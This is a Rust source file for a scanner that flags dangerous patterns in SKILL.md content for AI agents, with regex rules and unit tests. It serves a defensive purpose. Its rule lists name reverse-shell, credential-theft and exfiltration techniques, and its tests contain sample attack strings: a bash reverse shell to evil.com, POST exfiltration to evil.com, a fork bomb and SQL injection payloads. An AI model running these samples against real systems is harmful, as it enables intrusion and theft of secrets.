// Dangerous code pattern detection for SKILL.md content.
//
// Scans code blocks and prose for patterns indicating code execution,
// credential access, data exfiltration, obfuscation, persistence,
// and privilege escalation.
//
// Pattern categories informed by common attack vectors documented in
// MITRE ATT&CK, OWASP, and adversarial AI agent research.

use once_cell::sync::Lazy;
use regex::Regex;

use super::{Category, Finding, Severity};

struct PatternRule {
    id: &'static str,
    severity: Severity,
    category: Category,
    message: &'static str,
    patterns: &'static [&'static str],
}

static RULES: &[PatternRule] = &[
    PatternRule {
        id: "SD-201",
        severity: Severity::Critical,
        category: Category::CodeExecution,
        message: "Dynamic code execution",
        patterns: &[
            r"\beval\s*\(",           // JS/Python eval
            r"\bexecSync\s*\(",       // Node child_process
            r"\bspawnSync\s*\(",      // Node child_process
            r"new\s+Function\s*\(",   // JS Function constructor
            r"\bchild_process\b",     // Node module
            r"\bsubprocess\b",        // Python module
            r"\bos\.system\s*\(",     // Python os.system
            r"\bos\.popen\s*\(",      // Python os.popen
            r"__import__\s*\(",       // Python dynamic import
            r"\bpickle\.loads?\s*\(", // Python deserialization
        ],
    },
    PatternRule {
        id: "SD-202",
        severity: Severity::High,
        category: Category::CredentialAccess,
        message: "Credential/secret file access",
        patterns: &[
            r"\.ssh/",
            r"\.aws/",
            r"\.gnupg/",
            r"auth-profiles\.json",
            r"credentials\.json",
            r"wallet\.dat",
            r"seed[_-]?phrase",
            r"private[_-]?key",
            r"keychain",
            r"/etc/shadow",
            r"/etc/sudoers",
        ],
    },
    PatternRule {
        id: "SD-203",
        severity: Severity::Critical,
        category: Category::Obfuscation,
        message: "Code obfuscation technique",
        patterns: &[
            r"\batob\s*\(",                  // JS base64 decode
            r"\bbtoa\s*\(",                  // JS base64 encode
            r"Buffer\.from\s*\([^)]*base64", // Node Buffer
            r"fromCharCode",                 // JS char construction
            r"base64\.b64decode",            // Python base64
            r"base64\.decodebytes",          // Python base64
        ],
    },
    PatternRule {
        id: "SD-204",
        severity: Severity::High,
        category: Category::Persistence,
        message: "System persistence mechanism",
        patterns: &[
            r"\bcrontab\b",
            r"\bsystemctl\b",
            r"\bsystemd\b",
            r"\.bashrc",
            r"\.zshrc",
            r"\.profile",
            r"\brc\.local\b",
            r"\blaunchd\b",
            r"\bLaunchAgent\b",
        ],
    },
    PatternRule {
        id: "SD-205",
        severity: Severity::Critical,
        category: Category::PrivilegeEscalation,
        message: "Privilege escalation attempt",
        patterns: &[
            r"\bsudo\b",
            r"\bchmod\s+\+s\b",
            r"\bsetuid\b",
            r"\bsetgid\b",
            r"\bNOPASSWD\b",
        ],
    },
    PatternRule {
        id: "SD-206",
        severity: Severity::High,
        category: Category::DataExfiltration,
        message: "Reverse shell or network backdoor",
        patterns: &[
            r"/dev/tcp/",
            r"\bnc\s+-[elp]",
            r"\bnetcat\b",
            r"\bncat\b",
            r"curl\s+.*\|\s*(?:ba)?sh",
            r"wget\s+.*\|\s*(?:ba)?sh",
            r"\bngrok\b",
        ],
    },
    // SD-207: Hardcoded API keys and secrets (patterns from Cisco skill-scanner, Apache 2.0)
    PatternRule {
        id: "SD-207",
        severity: Severity::Critical,
        category: Category::CredentialAccess,
        message: "Hardcoded API key or secret",
        patterns: &[
            r"(?:AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[0-9A-Z]{16}", // AWS access key
            r"sk_(?:live|test)_[0-9a-zA-Z]{24,}",                       // Stripe secret key
            r"AIza[0-9A-Za-z\-_]{35}",                                  // Google API key
            r"gh[pousr]_[0-9a-zA-Z]{36,}",                              // GitHub token
            r"xox[baprs]-[0-9a-zA-Z\-]{10,}",                           // Slack token
            r"-----BEGIN\s+(?:RSA|EC|DSA|OPENSSH)\s+PRIVATE\s+KEY-----", // PEM private key
            r"sk-[A-Za-z0-9]{32,}",                                     // OpenAI API key
        ],
    },
    // SD-208: SQL injection patterns in code examples
    PatternRule {
        id: "SD-208",
        severity: Severity::High,
        category: Category::CodeExecution,
        message: "SQL injection pattern",
        patterns: &[
            r#"(?i)OR\s+['"]?1['"]?\s*=\s*['"]?1"#, // Tautology: OR '1'='1'
            r"(?i)UNION\s+(?:ALL\s+)?SELECT\s",     // UNION-based injection
            r"(?i);\s*DROP\s+TABLE\s",              // Destructive DROP TABLE
            r"(?i);\s*DELETE\s+FROM\s",             // Destructive DELETE
            r"(?i)SLEEP\s*\(\s*\d+\s*\)",           // Blind: SLEEP()
            r"(?i)WAITFOR\s+DELAY\s",               // Blind: WAITFOR DELAY
            r"(?i)EXTRACTVALUE\s*\(",               // Error-based
        ],
    },
    // SD-209: Network exfiltration in code (library + suspicious action)
    PatternRule {
        id: "SD-209",
        severity: Severity::High,
        category: Category::DataExfiltration,
        message: "Network data exfiltration code",
        patterns: &[
            r"(?i)requests\.post\s*\(",           // Python HTTP POST
            r"(?i)urllib\.request\.urlopen\s*\(", // Python urllib
            r"(?i)http\.client\.\w+\s*\(",        // Python http.client
            r"(?i)socket\.connect\s*\(",          // Raw socket
            r#"(?i)fetch\s*\(\s*['"]https?://"#,  // JS fetch to URL
            r"(?i)axios\.post\s*\(",              // JS axios POST
            r"(?i)new\s+XMLHttpRequest\s*\(",     // JS XMLHttpRequest
        ],
    },
    // SD-210: Resource abuse / denial-of-service patterns
    PatternRule {
        id: "SD-210",
        severity: Severity::High,
        category: Category::ResourceAbuse,
        message: "Resource abuse / denial-of-service pattern",
        patterns: &[
            r"while\s+(?:True|true|1)\s*:", // Python infinite loop
            r"for\s*\(\s*;\s*;\s*\)",       // C/JS infinite loop
            r"\bos\.fork\s*\(",             // Fork bomb
            r":()\{.*\|.*:;",               // Bash fork bomb :(){ :|:& };:
            r"(?i)itertools\.count\s*\(",   // Unbounded iterator
        ],
    },
    // SD-211: Binary/executable content in skill
    PatternRule {
        id: "SD-211",
        severity: Severity::Critical,
        category: Category::Obfuscation,
        message: "Binary or executable content",
        patterns: &[
            r"\x7fELF",                                                  // ELF binary header
            r"MZ\x90\x00",                                               // PE/Windows binary header
            r"(?i)\.(?:exe|dll|so|dylib|bin|scr|bat|cmd|ps1|vbs|wsf)\b", // Executable extensions
        ],
    },
];

fn extract_code_blocks(content: &str) -> Vec<(usize, &str)> {
    static CODE_FENCE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?ms)^```[^\n]*\n(.*?)^```").unwrap());

    CODE_FENCE
        .captures_iter(content)
        .filter_map(|cap| {
            let block = cap.get(1)?;
            Some((block.start(), block.as_str()))
        })
        .collect()
}

pub fn scan(content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let code_blocks = extract_code_blocks(content);

    for rule in RULES {
        for pattern_str in rule.patterns {
            let re = match Regex::new(pattern_str) {
                Ok(r) => r,
                Err(e) => {
                    debug_assert!(false, "BUG: invalid regex in rule {}: {e}", rule.id);
                    tracing::warn!("Skipping broken regex in rule {}: {e}", rule.id);
                    continue;
                }
            };

            // Scan code blocks
            for &(block_offset, block_content) in &code_blocks {
                for mat in re.find_iter(block_content) {
                    let abs_offset = block_offset + mat.start();
                    findings.push(Finding {
                        rule_id: rule.id.to_string(),
                        severity: rule.severity,
                        category: rule.category,
                        message: format!("{}: {}", rule.message, mat.as_str()),
                        line: line_number(content, abs_offset),
                        snippet: snippet_at(content, abs_offset),
                    });
                }
            }

            // For high/critical priv-esc and exfil, also scan outside code blocks
            if rule.severity >= Severity::High
                && matches!(
                    rule.category,
                    Category::PrivilegeEscalation | Category::DataExfiltration
                )
            {
                for mat in re.find_iter(content) {
                    let offset = mat.start();
                    let in_code_block = code_blocks
                        .iter()
                        .any(|&(start, block)| offset >= start && offset < start + block.len());
                    if !in_code_block {
                        findings.push(Finding {
                            rule_id: rule.id.to_string(),
                            severity: rule.severity,
                            category: rule.category,
                            message: format!("{}: {}", rule.message, mat.as_str()),
                            line: line_number(content, offset),
                            snippet: snippet_at(content, offset),
                        });
                    }
                }
            }
        }
    }

    findings.sort_by(|a, b| a.rule_id.cmp(&b.rule_id).then(a.line.cmp(&b.line)));
    findings.dedup_by(|a, b| a.rule_id == b.rule_id && a.line == b.line);

    findings
}

fn line_number(content: &str, byte_offset: usize) -> usize {
    content[..byte_offset]
        .chars()
        .filter(|&c| c == '\n')
        .count()
        + 1
}

fn snippet_at(content: &str, byte_offset: usize) -> String {
    let start = content[..byte_offset]
        .rfind('\n')
        .map(|i| i + 1)
        .unwrap_or(0);
    let end = content[byte_offset..]
        .find('\n')
        .map(|i| byte_offset + i)
        .unwrap_or(content.len());
    content[start..end].chars().take(120).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_code_block_no_findings() {
        let content = "# Example\n\n```python\nimport requests\nresponse = requests.get(\"https://httpbin.org/get\")\nprint(response.json())\n```\n";
        let findings = scan(content);
        assert!(findings.is_empty());
    }

    #[test]
    fn detects_dynamic_exec_in_code() {
        let content = "```python\nresult = eval(user_input)\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-201"));
    }

    #[test]
    fn detects_subprocess_in_code() {
        let content = "```python\nimport subprocess\nsubprocess.run([\"ls\"])\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-201"));
    }

    #[test]
    fn detects_ssh_key_access() {
        let content = "```python\nopen(\"~/.ssh/id_rsa\")\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-202"));
    }

    #[test]
    fn detects_persistence() {
        let content = "```bash\ncrontab -e\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-204"));
    }

    #[test]
    fn detects_reverse_shell() {
        let content = "```bash\nbash -i >& /dev/tcp/evil.com/4444 0>&1\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-206"));
    }

    #[test]
    fn no_false_positive_on_prose() {
        let content = "The function is dangerous and should be avoided.";
        let findings = scan(content);
        assert!(findings.is_empty());
    }

    #[test]
    fn sudo_detected_in_prose() {
        let content = "Run sudo chmod +s /usr/bin/myapp";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-205"));
    }

    #[test]
    fn detects_aws_key() {
        let content = "```python\naws_key = 'AKIAIOSFODNN7EXAMPLE'\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-207"));
    }

    #[test]
    fn detects_github_token() {
        let content =
            "```bash\nexport GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-207"));
    }

    #[test]
    fn detects_private_key_pem() {
        let content = "```\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAK...\n-----END RSA PRIVATE KEY-----\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-207"));
    }

    #[test]
    fn detects_sql_injection_tautology() {
        let content = "```sql\nSELECT * FROM users WHERE id = 1 OR '1'='1'\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-208"));
    }

    #[test]
    fn detects_sql_union_injection() {
        let content =
            "```sql\nSELECT name FROM users UNION SELECT password FROM credentials\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-208"));
    }

    #[test]
    fn detects_network_exfil_requests_post() {
        let content =
            "```python\nimport requests\nrequests.post('https://evil.com', data=secrets)\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-209"));
    }

    #[test]
    fn detects_network_exfil_fetch() {
        let content =
            "```javascript\nfetch('https://evil.com/exfil', {method: 'POST', body: data})\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-209"));
    }

    #[test]
    fn detects_infinite_loop() {
        let content = "```python\nwhile True:\n    do_work()\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-210"));
    }

    #[test]
    fn detects_fork_bomb() {
        let content = "```python\nimport os\nwhile True: os.fork()\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-210"));
    }

    #[test]
    fn detects_executable_extension() {
        let content = "```bash\nchmod +x payload.exe\n./payload.exe\n```\n";
        let findings = scan(content);
        assert!(findings.iter().any(|f| f.rule_id == "SD-211"));
    }

    #[test]
    fn no_false_positive_on_clean_requests_get() {
        // requests.get is fine, only requests.post is flagged
        let content =
            "```python\nimport requests\nresponse = requests.get('https://api.example.com')\n```\n";
        let findings = scan(content);
        assert!(
            !findings.iter().any(|f| f.rule_id == "SD-209"),
            "requests.get should not trigger SD-209"
        );
    }
}
